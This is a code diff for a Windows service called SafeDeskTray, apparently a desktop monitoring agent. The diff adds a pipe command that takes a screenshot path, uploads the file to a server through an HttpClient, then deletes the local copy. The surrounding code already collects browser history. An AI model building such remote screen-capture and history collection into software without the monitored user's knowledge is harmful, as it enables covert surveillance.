@@ -1,3 +1,4 @@
+#include "HttpClient.h"
 #include "SafeDeskTray.h"
 #include "Common.h"
 #include <sddl.h>
@@ -7,8 +8,7 @@
 
 #pragma comment(lib, "advapi32.lib")
 
-#define PRORCESS_LABLE L"PROCESS"
-#define APPDATA_LABEL L"APPDATA"
+std::set<int> command_set;
 
 SafeDeskTray::SafeDeskTray() {
 	m_hPipe = NULL;
@@ -37,11 +37,19 @@ void SafeDeskTray::ThreadCreateProcess() {
 			continue;
 		}
 
-		if (!StartProcessInUserSession(wszTrayPath)) {
-			LogToFile("Failed to start SafeDeskTray process.");
-		}
+        if (m_bStartProcess) {
+            if (!StartProcessInUserSession(wszTrayPath)) {
+                LogToFile("Failed to start SafeDeskTray process.");
+            }
+        }
+
 		std::this_thread::sleep_for(std::chrono::seconds(5));
 	}
+}
+
+bool SafeDeskTray::KillTrayProcess() {
+	ProcessMonitor& processMonitor = ProcessMonitor::GetInstance();
+	return processMonitor.StopProcess(std::wstring(PROCESS_TRAY_NAME));
 }
 
 bool SafeDeskTray::InitPipeServer() {
@@ -161,6 +169,19 @@ bool SafeDeskTray::InitPipeServer() {
                     std::wstring data2 = message.substr(sep1 + 1);
 					browserHistory.SetAppDataPath(data2);
 					LogToFile("Set AppData path to: " + std::string(data2.begin(), data2.end()));
+                } 
+                else if (data1 == CAPTURESCREEN_LABEL) {
+                    size_t sep2 = message.find(L'|', sep1 + 1);
+					if (sep2 != std::wstring::npos) {
+						std::wstring command_id = message.substr(sep1 + 1, sep2 - sep1 - 1);
+						std::wstring path = message.substr(sep2 + 1);
+                        HttpClient& httpClient = HttpClient::GetInstance();
+                        std::string sPath(path.begin(), path.end());
+                        httpClient.PostFileScreenshot(sPath, std::stoi(command_id));
+                        DeleteFileA(sPath.c_str());
+                        command_set.erase(std::stoi(command_id));
+					}
+                    
                 }
             }
         }
